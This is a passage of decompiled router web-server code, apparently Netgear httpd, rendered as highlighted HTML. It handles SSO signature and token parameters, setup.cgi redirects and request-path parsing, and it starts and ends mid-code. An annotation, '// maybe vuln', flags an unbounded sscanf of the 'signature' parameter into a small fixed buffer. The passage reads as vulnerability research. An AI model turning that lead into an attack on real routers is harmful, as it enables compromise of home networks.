class="string">&quot;0&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      nvram_set(<span class="string">&quot;sso_fail_times&quot;</span>, v107);</span><br><span class="line">      nvram_set(<span class="string">&quot;sso_from_internet&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">      nvram_commit();</span><br><span class="line">      v108 = dword_42C88C;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">        v108 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">      dword_42C88C = v108;</span><br><span class="line">      <span class="keyword">if</span> ( v106 &lt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        optlen = getpid();</span><br><span class="line">        <span class="keyword">if</span> ( v106 == <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&amp;timestamp=%d&quot;</span>, <span class="string">&quot;BRS_sso_fail.html&quot;</span>, optlen);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&amp;timestamp=%d&quot;</span>, <span class="string">&quot;BRS_sso_fail_msg.html&quot;</span>, optlen);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        optlena = getpid();</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&amp;timestamp=%d&quot;</span>, <span class="string">&quot;BRS_sso_status.html&quot;</span>, optlena);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_335:</span><br><span class="line">      v17 = <span class="number">302</span>;</span><br><span class="line">      v19 = v230;</span><br><span class="line">      v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v109 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;?error_code=2200&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v110 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v110)</span><br><span class="line">      &amp;&amp; !v102</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">      &amp;&amp; !dword_42C9D8 )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_set(<span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>, <span class="string">&quot;Already register by other SSO&quot;</span>);</span><br><span class="line">      v111 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v111 )</span><br><span class="line">        v111 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v112 = <span class="string">&quot;sso_first_time&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v111 == <span class="number">48</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v113 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_322;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_323;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v109, <span class="string">&quot;?signature=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v114 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v114)</span><br><span class="line">      &amp;&amp; !v102</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">      &amp;&amp; !dword_42C9D8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v225 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v226, <span class="number">0</span>, <span class="keyword">sizeof</span>(v226));</span><br><span class="line">      <span class="built_in">memset</span>(v229, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">      sc_get_sn(&amp;v225, <span class="number">43</span>);</span><br><span class="line">      v226[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">      v115 = <span class="built_in">strstr</span>(path, <span class="string">&quot;?signature=&quot;</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(v115 + <span class="number">11</span>, <span class="string">&quot;%s&quot;</span>, v229);            <span class="comment">// maybe vuln</span></span><br><span class="line">      <span class="keyword">if</span> ( isProductRegistered(&amp;v225, v229) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_first_time&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        v116 = <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_first_time&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">        v116 = <span class="string">&quot;No&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      nvram_set(<span class="string">&quot;RAE_devRegisterStatus&quot;</span>, v116);</span><br><span class="line">      nvram_commit();</span><br><span class="line">      system(<span class="string">&quot;/usr/bin/killall -SIGUSR1 sso_deamon&quot;</span>);</span><br><span class="line">      v117 = dword_42C88C;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">        v117 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">      dword_42C88C = v117;</span><br><span class="line">      <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&quot;</span>, <span class="string">&quot;index.htm&quot;</span>);</span><br><span class="line">      v17 = <span class="number">302</span>;</span><br><span class="line">      v19 = v230;</span><br><span class="line">      v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_427;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v109, <span class="string">&quot;?token=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v118 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v118)</span><br><span class="line">      &amp;&amp; !v102</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">      &amp;&amp; !dword_42C9D8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v225 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v226, <span class="number">0</span>, <span class="keyword">sizeof</span>(v226));</span><br><span class="line">      <span class="built_in">memset</span>(v228, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">      v229[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v229[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      v229[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">      v229[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">      LOBYTE(v229[<span class="number">4</span>]) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v227, <span class="number">0</span>, <span class="keyword">sizeof</span>(v227));</span><br><span class="line">      sc_get_sn(&amp;v225, <span class="number">43</span>);</span><br><span class="line">      v226[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">      v119 = nvram_get(<span class="string">&quot;sso_cur_sessionId&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v119 )</span><br><span class="line">        v119 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="built_in">snprintf</span>(v229, <span class="number">0x11</span>u, <span class="string">&quot;%s&quot;</span>, v119);</span><br><span class="line">      v120 = <span class="built_in">strstr</span>(path, <span class="string">&quot;?token=&quot;</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(v120 + <span class="number">7</span>, <span class="string">&quot;%s&quot;</span>, v228);</span><br><span class="line">      v121 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v121 )</span><br><span class="line">        v121 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v121 == <span class="number">48</span> )</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_first_time&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      v112 = <span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>;</span><br><span class="line">      v113 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">LABEL_322:</span><br><span class="line">      nvram_set(v112, v113);</span><br><span class="line">LABEL_323:</span><br><span class="line">      nvram_set(<span class="string">&quot;sso_from_internet&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">      nvram_commit();</span><br><span class="line">      v122 = dword_42C88C;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">        v122 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">      dword_42C88C = v122;</span><br><span class="line">      v123 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v123 )</span><br><span class="line">        v123 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v123 == <span class="number">98</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&quot;</span>, <span class="string">&quot;BRS_sso_success.html&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v124 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v124 )</span><br><span class="line">          v124 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *v124 == <span class="number">99</span> )</span><br><span class="line">          v125 = <span class="string">&quot;BRS_netgear_success.html&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v125 = <span class="string">&quot;index.htm&quot;</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&quot;</span>, v125);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_335;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v126 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v126 )</span><br><span class="line">    v126 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v126 != <span class="number">98</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v127 = nvram_get(<span class="string">&quot;sso_skip&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v127 )</span><br><span class="line">      v127 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v127 == <span class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v128 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v128 )</span><br><span class="line">        v128 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v128 == <span class="number">48</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v129 = nvram_get(<span class="string">&quot;internet_ok&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v129 )</span><br><span class="line">          v129 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *v129 == <span class="number">49</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v130 = nvram_get(<span class="string">&quot;mandate_sso&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v130 )</span><br><span class="line">            v130 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> ( *v130 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">          &#123;</span><br><span class="line">            v131 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !strcasecmp(v11, v131) &amp;&amp; !v102 )</span><br><span class="line">            &#123;</span><br><span class="line">              v132 = path;</span><br><span class="line">              <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.ico&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;sso_wait.html&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;BRS_sso_hijack.html&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;sso_fail&quot;</span>)</span><br><span class="line">                &amp;&amp; !dword_42C9D8</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;PWD_secure.htm&quot;</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                v133 = dword_42C88C;</span><br><span class="line">                <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">                  v133 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">                dword_42C88C = v133;</span><br><span class="line">                <span class="built_in">snprintf</span>(v229, <span class="number">0x64</span>u, <span class="string">&quot;Location:setup.cgi?next_file=%s&quot;</span>, <span class="string">&quot;sso_wait.html&quot;</span>);</span><br><span class="line">LABEL_426:</span><br><span class="line">                v17 = <span class="number">302</span>;</span><br><span class="line">                v19 = v229;</span><br><span class="line">                v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">LABEL_427:</span><br><span class="line">                v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v134 = nvram_get(<span class="string">&quot;openvpn_hijack&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v134 )</span><br><span class="line">    v134 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v134 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v135 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v135) &amp;&amp; !v102 )</span><br><span class="line">    &#123;</span><br><span class="line">      v136 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !dword_42C9D8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v137 = dword_42C88C;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">          v137 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_42C88C = v137;</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v229,</span><br><span class="line">          <span class="number">0x64</span>u,</span><br><span class="line">          <span class="string">&quot;Location: http://www.routerlogin.net/setup.cgi?next_file=%s&quot;</span>,</span><br><span class="line">          <span class="string">&quot;openvpn_confirm_update.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_426;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v138 = nvram_get(<span class="string">&quot;tc_from_old&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v138 )</span><br><span class="line">    v138 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v138 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v139 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v139) &amp;&amp; !v102 )</span><br><span class="line">    &#123;</span><br><span class="line">      v140 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !dword_42C9D8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v141 = dword_42C88C;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">          v141 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_42C88C = v141;</span><br><span class="line">        <span class="built_in">snprintf</span>(v229, <span class="number">0x64</span>u, <span class="string">&quot;Location: %s&quot;</span>, <span class="string">&quot;tc_exist_unit_hijack.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_426;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v142 = nvram_get(<span class="string">&quot;weak_password_check&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v142 )</span><br><span class="line">    v142 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v142 == <span class="number">49</span> &amp;&amp; access(<span class="string">&quot;/tmp/no_security_page&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v143 = nvram_get(<span class="string">&quot;user_ignore_weak_pw&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v143 )</span><br><span class="line">      v143 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v143 != <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v144 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v144 )</span><br><span class="line">        v144 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v144 != <span class="number">98</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v145 = path;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;PWD_secure.htm&quot;</span>) &amp;&amp; !do_ssl )</span><br><span class="line">        &#123;</span><br><span class="line">          v146 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !strcasecmp(v11, v146)</span><br><span class="line">            &amp;&amp; !v102</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;top.htm&quot;</span>)</span><br><span class="line">            &amp;&amp; !dword_42C9D8 )</span><br><span class="line">          &#123;</span><br><span class="line">            v147 = dword_42C88C;</span><br><span class="line">            <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">              v147 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">            dword_42C88C = v147;</span><br><span class="line">            <span class="built_in">snprintf</span>(v229, <span class="number">0x64</span>u, <span class="string">&quot;Location: %s&quot;</span>, <span class="string">&quot;PWD_secure.htm&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_426;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v148 = path;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.cgi&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(v148, <span class="string">&quot;.htm&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v148, <span class="string">&quot;shares&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v149 = <span class="built_in">strlen</span>(v148);</span><br><span class="line">    <span class="keyword">if</span> ( v149 &gt;= <span class="number">0x1E2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">404</span>;</span><br><span class="line">      v18 = &amp;unk_415C74;</span><br><span class="line">      v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;No such file.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">    strlcpy(byte_42C9E0, v148, v149 - <span class="number">8</span>);</span><br><span class="line">    v150 = <span class="built_in">strrchr</span>(byte_42C9E0, <span class="number">47</span>);</span><br><span class="line">    strlcpy(byte_42CBF4, byte_42C9E0, v150 - byte_42C9E0);</span><br><span class="line">    v151 = path;</span><br><span class="line">    <span class="keyword">if</span> ( *path == <span class="number">47</span> )</span><br><span class="line">      path = v151 + <span class="built_in">strlen</span>(byte_42CBF4) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;%s/setup.cgi?next_file=%s&quot;</span>, byte_42CBF4, path);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">  &#125;</span><br><span class="line">  v152 = path;</span><br><span class="line">  path = v152 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  v153 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  dword_42C88C = v153;</span><br><span class="line">  v17 = <span class="number">400</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v153 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_438;</span><br><span class="line">  &#125;</span><br><span class="line">  *v153 = <span class="number">0</span>;</span><br><span class="line">  dword_42C88C = (v153 + <span class="number">1</span>);</span><br><span class="line">  v154 = <span class="built_in">strchr</span>(path, <span class="number">63</span>);</span><br><span class="line">  dword_42C888 = v154;</span><br><span class="line">  <span class="keyword">if</span> ( v154 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v154 = <span class="number">0</span>;</span><br><span class="line">    v155 = v154 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v155 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_42C888 = v155;</span><br><span class="line">  v156 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v11, v156) )</span><br><span class="line">  &#123;</span><br><span class="line">    v157 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v158 = sub_405EE4(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v158) )</span><br><span class="line">    &#123;</span><br><span class="line">      v157 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v159 = sub_405EE4(<span class="number">3</span>);</span><br><span class="line">      v160 = strcasecmp(v11, v159) != <span class="number">0</span>;</span><br><span class="line">      v157 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v160 )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">501</span>;</span><br><span class="line">        v18 = <span class="string">&quot;Not Implemented&quot;</span>;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v20 = <span class="string">&quot;That method is not implemented.&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v161 = path;</span><br><span class="line">  dword_42C87C = v157;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;%00&quot;</span>) || (sub_406AF0(v161, v161), v162 = path, *path != <span class="number">47</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">400</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v20 = <span class="string">&quot;Bad filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  v163 = path + <span class="number">1</span>;</span><br><span class="line">  dword_42C880 = path + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v166 = <span class="built_in">strstr</span>(v162 + <span class="number">1</span>, <span class="string">&quot;//&quot;</span>);</span><br><span class="line">    v167 = v166;</span><br><span class="line">    <span class="keyword">if</span> ( !v166 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v166 